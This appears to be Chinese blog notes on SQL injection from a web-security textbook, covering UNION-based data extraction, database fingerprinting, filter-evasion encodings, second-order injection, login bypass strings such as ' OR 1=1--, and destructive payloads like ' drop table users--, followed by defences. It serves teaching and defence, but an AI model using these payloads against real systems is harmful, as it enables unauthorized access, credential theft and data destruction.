<h3 id="注入数字数据"><a href="#注入数字数据" class="headerlink" title="注入数字数据"></a>注入数字数据</h3><p>如果SQL查询合并用户提交的数字数据，应用程序仍然会将它包含在单引号之中，作为字符串数据进行处理。因此，一定要执行前面描述的针对字符串数据的渗透测试步骤。但是，许多时候，营养程序会将数字数据以数字格式直接传送到数据库中，并不把它放入单引号中。如果前面描述的测试方法无法检测到漏洞，还可以采取以下针对数字数据的特殊测试步骤。</p>
<p>测试步骤：</p>
<ol>
<li><p>尝试输入一个结果等于原始数字值的简单数学表达式。例如，原始值为2，尝试提交<strong>1+1</strong>或<strong>3-1</strong>。如果应用程序作出相同的响应，则表示它易于受到攻击。</p>
</li>
<li><p>如果证实被修改的数据会对应用程序的行为造成明显影响，则前面描述的测试方法最为可靠。例如，如果应用程序使用数字化PageID参数指定应返回什么内容，则用<strong>1+1</strong>代替2得到相同的结果明显表示存在SQL注入。但是如果能够在数字化参数中插入任意输入，但应用程序的行为却没有发生改变，那么前面的方法就无法发现漏洞。</p>
</li>
<li><p>如果第一个测试方法取得成功，就可以利用更复杂的、使用特殊SQL关键字和语法的表达式进一步获得与漏洞有关的证据。ASCII值位65，在SQL中，以下表达式等于2.</p>
<p><strong>67-ASCII(‘A’)</strong></p>
</li>
<li><p>如果单引号被过滤掉，那么前面的测试方法就没有作用。但是，这时可以利用这样一个事实：即在必要时，数据库会隐含地将数字数据转化为字符串数据。例如，因为字符1的ASCII值位49，在SQL中，以下表达式等于2.</p>
<p><strong>51-ASCII(1)</strong></p>
</li>
</ol>
<h3 id="注入查询结构"><a href="#注入查询结构" class="headerlink" title="注入查询结构"></a>注入查询结构</h3><p>如果用户提交的数据被插入SQL查询结构。而不是查询的数据项中，这时，实施SQL注入攻击只需要直接应用有效的SQL语法，而不需要任何“转义”。</p>
<p>SQL查询结构中最常见的注入点是ORDER BY子句。ORDER BY关键字接受某个列名称或编号，并根据该列中的值对结果集进行排序。</p>
<p>例如，使用以下查询可以检索一个可排序的图书表：</p>
<p><strong>SELECT author, title, year FROM bookes WHERE publisher = ‘Wiley’ ORDER BY title ASC</strong></p>
<p>如果ORDER BY中的列名称title由用户指定，就没有必要使用单引号，因为用户提交的数据已经直接修改了SQL查询的结构。</p>
<p>在列名称中查找SQL注入漏洞可能会相当困难。如果提交一个并非有效列名称的值，查询将导致错误。这意味着，无论攻击者提交路径遍历字符串、单引号、双引号或其他任意字符串，应用程序都会返回相同的响应。因此，采用程勇的自动模糊测试和手动测试技巧往往会遗漏某些漏洞。如果提交用于探查各种漏洞的标准测试字符串全部导致相同的响应，这本身并不表示出现任何错误。</p>
<ol>
<li><p>记下任何可能控制应用程序返回的结果的顺序或其中的字段类型的参数。</p>
</li>
<li><p>提供一系列在参数中提交数值值的请求，从数字1开始，然后逐个请求递增：</p>
<ol>
<li><p>如果更改输入中的数字会影响结果的顺序，则说明输入可能被插入到ORDER BY子句中。在SQL中，ORDER BY 1将依据第一列进行排序。然后将这个数字增加到2将更改数据的显示顺序，以依据第二个列进行排序。如果提交的数字大于结果集中的列数，查询将会失败。在这种情况下，可以通过使用以下字符串，检查是否可以颠倒结果的顺序，从而确认是否可以注入其他SQL：</p>
<p><strong>1 ASC –</strong></p>
<p><strong>1 DESC –</strong></p>
</li>
<li><p>如果提交数字1生成一组结果，其中一个列的每一行都包含一个1，则说明输入可能被插入到查询返回的列的名称中。例如：</p>
<p><strong>SELECT 1, title, year FROM book WHERE publisher = ‘Wiley’</strong></p>
</li>
</ol>
</li>
</ol>
<h2 id="“指纹”识别数据库"><a href="#“指纹”识别数据库" class="headerlink" title="“指纹”识别数据库"></a>“指纹”识别数据库</h2><p>即使由于某种原因无法提取到版本信息，还是可以使用其他方法识别数据库。一种最可靠的方法是根据数据库连接字符串的不同方式进行识别。在控制某个字符串数据项的查询中，可以在一个请求中提交一个特殊的值，然后测试各种连接方法，以生成那个字符串。如果得到相同的结果，皆可以确定所使用的数据库类型。下面的实例说明常用的数据库如何构建services字符串。</p>
<ul>
<li>Oracle：’serv’ || ‘ices’</li>
<li>MS-SQL: ‘serv’ + ‘ices’</li>
<li>MySQL: ‘serv’  ‘ices’ 【中间有空格】</li>
</ul>
<p>如果注入数字数据，则可以使用下面的攻击字符串来识别数据库。每个数据项在目标数据库中的求值结果为0，在其他数据库中则会导致错误。</p>
<ul>
<li>Oracle：BITAND(1, 1)-BITAND(1, 1)</li>
<li>MS-SQL: @@PACK_RECEIVED-@@PACK_RECEIVED</li>
<li>MySQL: CONNECTION_ID()-CONNECTION_ID()</li>
</ul>
<p>在识别数据库时，MySQL如何处理某些行内注释也是一个值得关注的问题。吐过一个注释以感叹号开头，接着是数据库版本字符串，那么只要数据库的实际版本等于或高于那个字符串，应用程序就会将注释内容解释为SQL；否则，应用程序就会忽略注释内容，将它作为注释处理。与C中的预处理指令类似，程序员也可以对这一点加以利用，编写出根据所使用数据库版本进行处理的不同代码。攻击者还可以利用它来识别数据库的实际版本。例如，如果使用的MySQL版本高于或等于3.23.02，注入下面的字符串将使SELECT语句的WHERE子句为假：</p>
<p><strong>/*!32302 and 1=0 */</strong></p>
<h2 id="UNION-操作符"><a href="#UNION-操作符" class="headerlink" title="UNION 操作符"></a>UNION 操作符</h2><p>SQL使用UNION操作符将两个或几个SELECT语句的记过组合到一个独立结果中。如果一个Web应用程序的SELECT语句存在SQL注入漏洞，通常可以使用UNION操作符执行另一次完全独立的查询，并将它的结果与第一次查询的结果组合在一起。如果应用程序向浏览器返回查询结果，那么就可以使用这种技巧从应用程序中提取任意的数据。</p>
<p>UNION操作符可在SQL注入中发挥非常巨大的作用。但是，在利用它发动攻击之前，攻击者有必要了解它的两个重要限制。</p>
<ol>
<li>如果使用UNION操作符组合两个查询的结果，这两个结果必须结构相同。也就是说他们的列数必须相同，必须使用按相同顺序出现的相同或兼容的数据类型。</li>
<li>为注入另一个返回有用结果的查询，攻击者必须知道他所针对的数据库表的名称以及有关列的名称。</li>
</ol>
<h2 id="使用UNION提取数据"><a href="#使用UNION提取数据" class="headerlink" title="使用UNION提取数据"></a>使用UNION提取数据</h2><p>下面我们将分析一个攻击，虽然该攻击针对的是MS-SQL数据库，但它采用的攻击方法适用于所有数据库技术。以用户维护联系人列表及查询和更新联系人信息的通讯录应用程序为例。如果用户在通讯录中搜索名为Matthew的联系人，浏览器将提交以下数据：</p>
<p><strong>Name= Matthew</strong></p>
<table>
<thead>
<tr>
<th>人名</th>
<th>电子邮件地址</th>
</tr>
</thead>
<tbody><tr>
<td>Matthew Adamson</td>
<td><a href="mailto:handtrick@gmail.com">handtrick@gmail.com</a></td>
</tr>
</tbody></table>
<p>首先，我们需要确定请求的猎术。对单一列进行测试导致了以下错误消息：</p>
<p><strong>Name=Matthew’%20union%20select%20null–</strong></p>
<p>All queries combined using a UNION, INTERSECT or EXCEPT operator must hava an equal number of expressions in their target lists.</p>
<p>我们添加另一个NULL，并得到同样的错误。于是，我们继续添加NULL， 知道查询被执行，并在结果表中生成另一个数据项，如下所示：</p>
<p><strong>Name=Matthew’%20union%20select%20null,null,null,null,null–</strong></p>
<table>
<thead>
<tr>
<th>人名</th>
<th>电子邮件格式</th>
</tr>
</thead>
<tbody><tr>
<td>Matthew Adamson</td>
<td><a href="mailto:handtrick@gmail.com">handtrick@gmail.com</a></td>
</tr>
<tr>
<td>[空]</td>
<td>[空]</td>
</tr>
</tbody></table>
<p>我们验证查询的第一列是否包含字符串数据：</p>
<p><strong>Name=Matthew’%20union%20select%20’a’,null,null,null,null–</strong></p>
<table>
<thead>
<tr>
<th>人名</th>
<th>电子邮件格式</th>
</tr>
</thead>
<tbody><tr>
<td>Matthew Adamson</td>
<td><a href="mailto:handtrick@gmail.com">handtrick@gmail.com</a></td>
</tr>
<tr>
<td>[a]</td>
<td>[空]</td>
</tr>
</tbody></table>
<p>接下来，需要查明可能包含有用信息的数据库表和列的名称。为此，我们需要查询元数据表information_schema .columns，其中包含数据库中的所有表和列名称的详细资料。使用以下请求可以检索上述信息：</p>
<p><strong>Name=Matthew’%20union%20select%20table_name,column_name,null,null,null%20from%20information_schema.columns–</strong></p>
<table>
<thead>
<tr>
<th>人名</th>
<th>电子邮件地址</th>
</tr>
</thead>
<tbody><tr>
<td>Matthew Adamson</td>
<td><a href="mailto:handytrick@gmail.com">handytrick@gmail.com</a></td>
</tr>
<tr>
<td>shop_items</td>
<td>Price</td>
</tr>
<tr>
<td>shop_items</td>
<td>Prodid</td>
</tr>
<tr>
<td>shop_items</td>
<td>Prodname</td>
</tr>
<tr>
<td>addr_book</td>
<td>Contactemail</td>
</tr>
<tr>
<td>addr_book</td>
<td>Contactname</td>
</tr>
<tr>
<td>Users</td>
<td>Username</td>
</tr>
<tr>
<td>Users</td>
<td>Password</td>
</tr>
</tbody></table>
<p>从以上结果可以确定，很明显，我们可以同用户表开始提取数据。这是使用以下查询：</p>
<p><strong>Name=Matthew’%20UNION%20select%20username,password,null,null,null%20from%20users–</strong></p>
<table>
<thead>
<tr>
<th>人名</th>
<th>电子邮件地址</th>
</tr>
</thead>
<tbody><tr>
<td>Matthew Adamson</td>
<td><a href="mailto:handytrick@gmail.com">handytrick@gmail.com</a></td>
</tr>
<tr>
<td>administrator</td>
<td>fme69</td>
</tr>
<tr>
<td>dev</td>
<td>uber</td>
</tr>
<tr>
<td>marcus</td>
<td>8printo</td>
</tr>
<tr>
<td>smith</td>
<td>twosisty</td>
</tr>
<tr>
<td>jlo</td>
<td>6kdown</td>
</tr>
</tbody></table>
<p>MS-SQL、MySQL和许多其他数据库（包括SQLite和Postgresql）均支持information_schema。它主要用于保存数据库元数据，这也使它成为探查数据库的攻击者的主要目标。需要注意的是，Oracle并不支持该方案。对Oracle数据库实施攻击时，攻击方法在其他各方面可能完全相同。但是，需要使用查询SELECT table_name,column_name FROM all_tab_columns来检索有关数据库表和列的信息。（使用user_tab_columns表以针对当前数据库）通常，在分析大型数据库以探查攻击目标时，最好是查找有用的列名称，而不是表。例如：</p>
<p><strong>SELECT table_name,column_name FROM  infotmation_schema.columns where column_name like ‘%PASS%’</strong></p>
<p>如果目标表返回了多个列，则可以将这些列串联到一个单独列中，这样肩锁起来会更加方便，因为，这时只需要在原始查询中确定一个varchar字段：</p>
<ul>
<li>Oracle：SELECT table_name||’:’||cikumn_name FROM all_tab_columns</li>
<li>MS-SQL:SELECT table_name+’:’+column_name from information_schema.columns</li>
<li>MySQL: SELECT CONTACT(table_name,’:’,column_name) FROM information_schema.columns</li>
</ul>
<h2 id="避开过滤"><a href="#避开过滤" class="headerlink" title="避开过滤"></a>避开过滤</h2><p>有时，易受SQL注入攻击的应用程序可能会执行各种输入过滤以防止攻击者无限制地利用其中存在的缺陷。例如，应用程序可能会删除或净化某些字符，或阻止常用的SQL关键字。这种过滤通常非常容易避开，这时可尝试使用各种技巧。</p>
<h3 id="避免使用被阻止的字符"><a href="#避免使用被阻止的字符" class="headerlink" title="避免使用被阻止的字符"></a>避免使用被阻止的字符</h3><p>如果应用程序删除或编码某些在SQL注入攻击中经常用到的字符，不使用这些字符仍然能够实施攻击。</p>
<ul>
<li><p>如果要注入数字数据字段或列名称，不一定必须使用单引号。要在攻击有效载荷中插入字符串，不使用引号仍可以做到这一点。这时，可以通过各种字符串函数，使用每个字符的ASCII代码动态构建一个字符串。例如，下面两个查询分别用于Oracle和MS-SQL，它们等同于SELECT ename,sal from emp where ename = ‘marcus’:</p>
<p><strong>SELECT ename, sal FROM emp where ename=CHR(109)||CHR(97)||CHR(114)||CHR(99)||CHR(117)||CHR(115)</strong></p>
</li>
<li><p>如果注释符号被阻止，通常可以设计注入的数据，使其不会破会周围查询的语法。例如，不用注入</p>
<p><strong>‘ or 1=1–</strong></p>
<p>可以注入</p>
<p><strong>‘ or ‘a’=’a</strong></p>
</li>
<li><p>在MS-SQL数据库中注入批量查询时，不必使用分号分隔符。只要纠正所有批量查询的语法，无论你是否使用分号，查询解析器都会正确解释他们。</p>
</li>
</ul>
<h3 id="避免使用简单确认"><a href="#避免使用简单确认" class="headerlink" title="避免使用简单确认"></a>避免使用简单确认</h3><p>一些输入确认机制使用一个简答的黑名单，阻止或删除任何出现在这个名单中的数据。在这种情况下，应该尝试使用标准的攻击方法，寻找确认和规范化机制中的常见缺陷。例如，如果SELECT关键字被阻止或删除，可以尝试使用以下输入：</p>
<p><strong>SeleCt</strong></p>
<p><strong>%00SELECT</strong></p>
<p><strong>SELSELECTECT</strong></p>
<p><strong>%52%45%4c%45%43%54</strong></p>
<p><strong>%2553%2545%254c%2545%2543%2554%</strong></p>
<h3 id="使用SQL注释"><a href="#使用SQL注释" class="headerlink" title="使用SQL注释"></a>使用SQL注释</h3><p>与C++一样，我们也可以再SQL语句中插入行内注释，注释内容包含在<strong>/*</strong>与<strong>*/之间</strong>。如果应用程序阻止或删除输入中空格，可以使用注释“冒充注入数据中的空白符。例如：</p>
<p><strong>SELECT /*foo*/ username,password FR/<em>foo\</em>/OM users</strong></p>
<p>在MySQL语法中，注释甚至可以插入关键字中，这种方法可避开某些输入确认过了，同时保留查询中的语法。例如：</p>
<p><strong>SEL/*foo*/ECT /*foo*/ username,password FR/<em>foo\</em>/OM users</strong></p>
<h3 id="利用有缺陷的过滤"><a href="#利用有缺陷的过滤" class="headerlink" title="利用有缺陷的过滤"></a>利用有缺陷的过滤</h3><p>输入确认机制通常包含逻辑缺陷，可对这些缺陷加以利用，使被阻止的输入避开过滤。多数情况下，这类攻击会利用应用程序在对多个确认步骤进行排序，或未能以递归方式应用净化逻辑方面的缺陷。</p>
<h2 id="二阶SQL注入"><a href="#二阶SQL注入" class="headerlink" title="二阶SQL注入"></a>二阶SQL注入</h2><p>一种特别有益的避开过滤的方法与二阶有关。当数据首次插入数据库中时，许多应用程序能够安全处理这些数据。但是，一旦数据存储在数据库中，随后应用程序本身或其他后端进程可能会以危险的方式处理这些数据。许多这类应用程序并不想面向因特网的主要应用程序一样安全，但却拥有较高权限的数据库账户。</p>
<p>在一些应用程序中，用户输入在到达时通过转义单引号来进行确认。在前面搜索书籍的示例中，这种方法明显有效。当用户输入搜索项O’Reilly时，应用程序执行以下查询：</p>
<p><strong>SELECT author,title,year FROM books WHERE publisher = ‘O’’Reilly’</strong></p>
<p>在这个查询中，用户提交的单引号被转换为两个单引号，因而传送给数据库的搜索项与用户最初的输入的表达式具有相同的字符含义。</p>
<p>与单引号配对方法有关的问题出现在更复杂的情形中，此时同一个数据项被提交给几个SQL查询，然后写入数据库被几次读取。</p>
<p>回到前面那个允许用户自我注册并且在一个INSERT语句中存在SQL注入漏洞的应用程序。假设开发者将修复出现在用户数据中的所有单引号配对导致的漏洞。注册用户名<strong>foo’</strong>来建立如下查询，他不会在数据库中造成问题：</p>
<p><strong>INSERT INTO users (username, password, ID,privs) VALUES(‘foo’’’, ‘secret’, 2248, 1)</strong></p>
<p>目前为止，一切正常。然而，假设应用程序还执行密码修改功能，那么只有通过验证的用户才能访问这项功能，而且为了加强保护，应用程序要求用户提供原始密码。然后应用程序从数据库中提取用户的当前密码，并对两个字符串进行比较，核对用户提供的密码是否正确。要完成核对任务，它首先要从数据库中提取用户的用户名，然后建立如下查询：</p>
<p><strong>SELECT password FROM users WHERE username = ‘foo’’</strong></p>
<p>因为保存在数据库中的用户名是字面量字符串foo’，当应用程序提出访问要求时，数据库即返回这个值；只有在字符串被传送给数据库时才使用配对的转义序列。因此，当应用程序重复使用这个字符串并将它嵌入到另一个查询中时，就会造成一个SQL注入漏洞，用户最初的恶意输入就被嵌入到查询中。当用户尝试修改密码时，应用程序返回以下消息，暴露了上述缺陷：</p>
<p><strong>Unclosed quotation mark before the character string ‘foo</strong></p>
<p>要利用这种漏洞，攻击者值需注册一个包含专门设计的输入用户名，然后尝试修改密码。例如，如果注册如下用户名：</p>
<p><strong>‘ or 1 in (select password from users where username = ‘admin’)–</strong></p>
<p>注册步骤将会被应用程序安全处理。如果攻击者尝试修改密码，他注入的查询就会执行，导致生成以下消息，泄露管理员的密码：</p>
<p><strong>Microsoft OLE DB Provider for ODBC Drivers error ‘80040e07’</strong></p>
<p><strong>Microsoft ODBC SQL Server Driver SQL Server Systax error converting</strong></p>
<p>*<em>the varchar value ‘fme69’ to a column of data type int *</em></p>
<p>攻击者已经成功避开旨在阻止SQL注入攻击的输入确认，现在他能够在数据库中执行任意查询并获得查询结果。</p>
<h2 id="高级利用"><a href="#高级利用" class="headerlink" title="高级利用"></a>高级利用</h2><p>应用程序所有者应该意识到，并非所有攻击都旨在盗窃敏感数据。一些攻击可能更具破坏性，例如，仅仅提交12个字符的输入，攻击者就能够给使用关闭命令（shutdown`）关闭一个MS-SQL数据库。</p>
<p><strong>‘ shutdown–</strong></p>
<p>攻击者还可以注入恶意命令，如下面这些命令可删除一些数据库表：</p>
<p><strong>‘ drop table users–</strong></p>
<p><strong>‘ drop table accounts–</strong></p>
<p><strong>‘ drop table customers–</strong></p>
<h3 id="获取数字数据"><a href="#获取数字数据" class="headerlink" title="获取数字数据"></a>获取数字数据</h3><p>如果包含单引号的输入得到正确处理，那么应用程序中的字符串字段就不易受SQL注入攻击。但是，数字数据字段可能仍可能存在漏洞。在这种字段中，用户输入并不包含在单引号中。这时攻击者只有通过应用程序的数值响应，才能获得注入查询的结果。</p>
<p>在这种情况下，攻击者需要做的是获取数字形式的有用数据，对注入查询的结果进行处理。他们可以使用以下两个关键函数：</p>
<ul>
<li>ASCII，它返回输入字符的ASCII代码；</li>
<li>SUBSTRING（或Oracle中的SUBSTR），它返回输入的子字符串。</li>
</ul>
<p>这些函数可结合在一起使用，以数字形式从一个字符串中提取一个单独字符。例如：</p>
<p><strong>SUBSTRING(‘Admin’, 1, 1)返回A</strong></p>
<p><strong>ASCII(‘A’)返回65</strong></p>
<p>因此</p>
<p><strong>ASCII(SUBSTR(‘Admin’, 1, 1))</strong></p>
<p>使用者两个函数，可以系统地将一个有用数据的字符串分割成单个的字符，并以数字形式分别返回每一个字符。在自定义攻击中，可以利用这种技巧，以一次一个字节的速度，迅速获得并重建大量基于字符串的数据。</p>
<h3 id="使用带外通道"><a href="#使用带外通道" class="headerlink" title="使用带外通道"></a>使用带外通道</h3><p>在许多SQL注入攻击中，应用程序并不在用户的浏览器中显示注入查询的结果，也不返回数据库生成的任何错误消息。很明显，在这种情况下，即使一个SQL注入漏洞确实存在，攻击者也无法对其加以利用，提取任意数据或执行任何其他操作。但是，这种想法是错误的，及时出现这种情况，仍然可以使用各种技巧获取数据、确认其他恶意操作是否取得成功。</p>
<p>许多时候，可以注入一个任意查询，但却无法获得查询结果。回到那个易受攻击的登录表单，它的用户名和密码字段易于遭受SQL注入：</p>
<p><strong>SELECT * FROM  users WHERE username = ‘marcus’ and password = ‘secret’</strong></p>
<p>除了修改查询逻辑以避开登录外，还可以注入一个完全独立的子查询，使用字符串连接符把这个子查询的结果与控制的数据项连接起来。例如：</p>
<p><strong>foo’ || (SELECT 1 FROM dual WHERE (SELECT username FROM all_users WHERE username=’SBSNMP’) = ‘DBSNMP’)–</strong></p>
<p>应用程序将执行以下查询：</p>
<p><strong>SELECT * FROM users WHERE username = ‘foo’ || (SELECT 1 FROM dual WHERE (SELECT username FROM all_users WHERE username = ‘DBSNMP’) = ‘DBSNMP’)</strong></p>
<p>数据库将执行注入的任何子查询，并将它的结果附加在foo之后，然后查找所生成用户名的资料。当然，这种登录不会成功，但会执行注入的查询。在应用程序响应中受到的只是标准的登录失败消息。现在需要想办法获得注入查询的结果。</p>
<p> 如果能对MS-SQL数据库使用批量查询，这时就会出现另一种情形。批量查询特别有用，因为它们允许执行一个完全独立的语句，在这个过程中，渗透测试员拥有全部的控制权，可以使用另外的SQL语句并针对不同的表进行查询。但是，因为批量查询执行查询的方式比较特殊，我们无法直接获得注入查询的执行结果，同样需要想办法获得注入查询的结果。</p>
<p>在这种情况下，一种获取数据的有效方法是使用带外通道。能够在数据库中执行任意SQL语句后，渗透测试员往往可以利用数据库的一些内置功能在护具库与自己的计算机之间建立网络连接，通过它传送从数据库中收集到的任何数据。</p>
<p>建立适当网络连接的方法以不同的数据库而定，而且取决于应用程序访问数据库所使用的的用户权限。</p>
<h2 id="扩大数据库攻击范围"><a href="#扩大数据库攻击范围" class="headerlink" title="扩大数据库攻击范围"></a>扩大数据库攻击范围</h2><p>成功利用一个SQL注入漏洞往往可完全控制应用程序的所有数据。大多数应用程序仅使用一个账户访问数据库，并且依赖应用程序层控制在不同的用户间实施访问隔离。如果能够无限制地使用应用程序的数据库账户，就可以自由访问其中的数据。</p>
<p>因此，可以假设，拥有应用程序的所有数据时SQL注入攻击的最终目的。然而，许多原因表名，利用数据库中的漏洞，或者控制它的一些内置功能以达到目的，从而进一步实施攻击，可能会取得更大的功效。通过扩大数据库攻击范围可实施的其他攻击如下：</p>
<ul>
<li>如果数据库被其他引用程序共享，可以通过提升数据库的使用权限访问其他应用程序的数据。</li>
<li>可以攻破数据库服务器的操作系统。</li>
<li>可以访问其他系统。通常，数据库服务器是一个在基层网络边界防御保护下的网络中的主机。如果能够控制数据库服务器，攻击者就处在一个可信的位置上，可以访问其他主机的关键服务，进一步对其加以利用。</li>
<li>可以在主机基础架构与自己的计算机之间建立网络连接。这样，攻击者就可以完全避开应用程序的防御，轻易传送从数据库收集到的大量敏感数据，并且可穿透许多入侵检测系统。</li>
<li>可以通过创建用户定义的功能任意扩充数据库的现有功能。有些时候，可以通过这种方式重新执行已被删除或禁用的功能，避开数据库实施的强化保护措施，只要已经获得数据库管理员权限，就有办法在每种主流数据库中执行这种操作。</li>
</ul>
<h2 id="防止SQL注入"><a href="#防止SQL注入" class="headerlink" title="防止SQL注入"></a>防止SQL注入</h2><h3 id="部分有效的防御措施"><a href="#部分有效的防御措施" class="headerlink" title="部分有效的防御措施"></a>部分有效的防御措施</h3><p>由于单引号在SQL注入漏洞中占有突出地位，繁育这种攻击的一种常用方法，就是将用户输入的任何单引号配对，对它们进行转义。但是，在下面两种情况下，这种方法无效。</p>
<ul>
<li>如果用户提交的数字数据内置在SQL查询中，这种数据通常并不包含在单引号内。因此，攻击者能够破坏数据的使用环境并开始输入任意SQL查询，这时就不必输入单引号。</li>
<li>在二阶SQL注入攻击中，最初在插入数据库中时已经安全转移的数据随后被从数据库中读取出来，然后又再次写入。当重新使用数据时，最初配对的引号又恢复到单引号形式。</li>
</ul>
<p>另一种常用的应对措施是使用存储过程完成全部数据库访问。无疑，定制的存储过程可增强安全性，提高性能；然而，由于两方面的原因，它们并不能保证防止SQL漏洞：</p>
<ul>
<li>编写存在缺陷的存储过程可能在自身代码中包含SQL注入漏洞。</li>
<li>及时使用安全可靠的存储过程，但如果使用用户提交的输入以不安全的方式调用这个存储过程，也仍然可能出现SQL注入漏洞。</li>
</ul>
<h3 id="参数化查询"><a href="#参数化查询" class="headerlink" title="参数化查询"></a>参数化查询</h3><p>大多数数据库和应用程序开发平台都提供API，对不可信的输入进行安全处理，以防止SQL注入漏洞。参数化查询分两个步骤建立一个包含用户输入的SQL语句。</p>
<ol>
<li>应用程序制定查询结构，为用户输入的每个数据预留字符；</li>
<li>应用程序制定每个占位符的内容；</li>
</ol>
<p>至关重要的是，在第二个步骤中制定的专门设计的数据无法破坏在第一个步骤中制定的查询结构。因为查询结构已经确定，且相关API对所有类型的占位符数据进行安全处理，因此它总被解释为数据，而不是语句结构的一部分。</p>
<p>使用参数化查询可有效防止SQL注入，但还要注意一下几个重要的限制。</p>
<ul>
<li>应在每一个数据库查询中使用参数化查询。</li>
<li>插入查询中的每一种数据都应适当进行参数化。</li>
<li>参数占位符不能用于指定查询中的表和列的名称。</li>
<li>参数占位符不能用于查询的任何其他部分，如Order by子句中的ASC或DESC关键字，或其他任何SQL关键字，因为它们属于查询结构的一部分。</li>
</ul>
<h3 id="深层防御"><a href="#深层防御" class="headerlink" title="深层防御"></a>深层防御</h3><p>通常，一种稳定的安全机制应采用深层防御措施提供额外的保护，以防止前端防御由于任何原因失效。当防御针对后端数据库的攻击时，应采用另外三层防御。</p>
<ul>
<li>当访问数据库时，应用程序应尽可能使用最低权限的账户。</li>
<li>许多企业数据库包含大量默认功能，可被能够执行任意SQL语句的攻击者利用。</li>
<li>应评估、测试并及时安装供应商发布的所有安全补丁，以修复数据库软件本身已知的漏洞。</li>
</ul>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>SQL</tag>
        <tag>安全</tag>
        <tag>Web</tag>
        <tag>注入</tag>
      </tags>
  </entry>
  <entry>
    <title>注入解释型语言</title>
    <url>/2019/03/22/%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/4-1%E6%B3%A8%E5%85%A5%E8%A7%A3%E9%87%8A%E6%80%A7%E8%AF%AD%E8%A8%80/</url>
    <content><![CDATA[<h1 id="攻击数据存储"><a href="#攻击数据存储" class="headerlink" title="攻击数据存储"></a>攻击数据存储</h1><h1 id="注入解释性语言"><a href="#注入解释性语言" class="headerlink" title="注入解释性语言"></a>注入解释性语言</h1><p>解释性语言（interpreted language）是一种在运行时有一个运行时组件（runtime component）解释语言代码并执行其中包含的指令的语言。与之相对，编译型语言（compiled language）是这样一种语言：它的代码在生成时转换成机器指令，然后在运行时直接由使用该语言的计算机处理器执行这些指令。</p>
<p>从理论上说，任何语言都可使用编译器或解释器来执行，这种区别并不是语言本身的内在特性。但是，大多数语言仅通过上述其中一种方式执行，开发Web应用程序使用的许多核心语言使用解释器执行，包括SQL、LDAP、Perl和PHP。</p>
<p>基于解释型语言的执行方式，产生了一系列叫做代码注入（code injection）的漏洞。任何有实际用途的应用程序都会受到用户提交的数据，对其进行处理并执行相应的操作。因此，由解释器处理的数据实际上是由程序员编写的代码和用户提交的数据共同组成的。有些时候，攻击者可以提交专门设计的输入，通常提交某个在应用程序中使用解释型语言语法的具有特殊意义的句法，向应用程序实施攻击。结果，这个输入的一部分被解释称程序指令执行，好像它们是由最初的程序员编写的代码一样。因此，如果这种攻击取得成功，它将完全攻破目标应用程序的组件。</p>
<p>另一方面，在编译型语言中实施旨在执行任意命令的攻击往往非常困难。这是，注入代码的方法通常并不利用开发目标程序所使用的语言的任何语法特性，注入的有效载荷为机器代码，而不是用哪种语言编写的指令。</p>
<h2 id="避开登录"><a href="#避开登录" class="headerlink" title="避开登录"></a>避开登录</h2><p>无论访问操作是由普通用户还是应用程序管理员触发，应用程序访问数据存储区的过程都大致相同。Web应用程序对数据存储区实施自主访问控制，构造查询基于用户的账户和类型来检索、添加或修改数据存储区中的数据。修改查询（不只是查询中的数据）的成功注入攻击可以避开应用程序的自主访问控制并获取未授权访问。</p>
<p>如果需要安全保护的应用程序逻辑有查询结果控制，攻击者就可以通过修改查询来更改应用程序的逻辑。举一个典型的例子-在后端数据存储区的用户表中查询与用户提供的证书匹配的记录。许多实施基于表单的登录功能的应用程序使用数据库来存储用户证书，并执行简单的SQL查询来确认每次登录尝试。以下是一个典型的示例：</p>
<p><strong>SELECT * FROM users WHERE username = ‘marcus’ and password = ‘secret’</strong></p>
<p>这个查询要求数据库检查用户表中的每一行，提取出每条username列值为marcus、password列值为secret的记录。如果应用程序收到一名用户的资料，登录尝试将取得成功，应用程序将为该用户建立一个通过验证的会话。</p>
<p>在这种情况下，攻击者可以注入用户名或者密码字段，以修改应用程序执行的查询，从而破坏它的逻辑。例如，如果攻击者知道应用程序管理员的用户名为admin，那么他就可以通过提交一下用户名和任意密码，以管理员身份登录：</p>
<p><strong>admin’–</strong></p>
<p>应用程序将执行以下查询：</p>
<p><strong>SELECT * FROM users WHERE username=’admin’–’ AND password = ‘foo’</strong></p>
<p>因为其中使用了注释符号（–），上面的查询等同于：</p>
<p><strong>SELECT * FROM users WHERE username = ‘admin’</strong></p>
<p>于是这个查询完全避开了密码检查。</p>
<p>加入攻击者不知道管理员的用户名，该如何实施攻击呢？在大多数应用程序中，数据库的第一个账户为管理账户，因为这个账户通常手工创建，然后再通过它生成其他应用程序账户。而且，如果查询返回几名用户的资料，许多应用程序只会处理第一名的用户。因此，攻击者可利用这种行为，通过提交一下用户名，以数据库中的第一个用户的身份登录：</p>
<p><strong>‘ OR 1 = 1–</strong></p>
<p>应用程序将执行一下查询：</p>
<p><strong>SELECT * FROM users WHERE username = ‘’ OR 1=1– ‘ AND password = ‘foo’</strong></p>
<p>因为其中使用了注释符号，上面的查询等同于：</p>
<p><strong>SELECT * FROM  users WHERE username = ‘’ or 1=1</strong></p>
<p>该查询将返回全部应用程序用户的资料。</p>
]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>安全</tag>
        <tag>Web</tag>
        <tag>注入</tag>
        <tag>解释性语言</tag>
      </tags>
  </entry>
  <entry>
    <title>攻击数据存储区</title>
    <url>/2019/03/21/%E5%AE%89%E5%85%A8/Web%E5%AE%89%E5%85%A8/4.%E6%94%BB%E5%87%BB%E6%95%B0%E6%8D%AE%E5%AD%98%E5%82%A8%E5%8C%BA/</url>
    <content><![CDATA[<h1 id="攻击数据存储"><a href="#攻击数据存储" class="headerlink" title="攻击数据存储"></a>攻击数据存储</h1><p>几乎所有应用程序都依赖数据存储区来管理在应用程序中处理的数据。在许多情况下，这些数据负责处理核心应用程序逻辑、保存用户账户、权限。应用程序配置设置等。现在数据存储区已不再是被动的数据容器。大多数数据存储区都保存有结构化、可以使用预先定义的查询格式或语言访问的数据，并包含内部逻辑来管理这些数据。</p>
<p>通常，应用程序使用常用的权限级别来管理对数据存储区的各种访问操作，以及处理属于不同应用程序用户的数据。如果攻击者能够破坏应用程序与数据存储区的交互，使应用程序检索或修改各种数据，那么，攻击者就可以避开在应用层次对数据访问实施的任何控制。</p>
<ol>
<li><p>注入解释性语言</p>
</li>
<li><p>注入SQL</p>
</li>
<li><p>注入NoSQL</p>
</li>
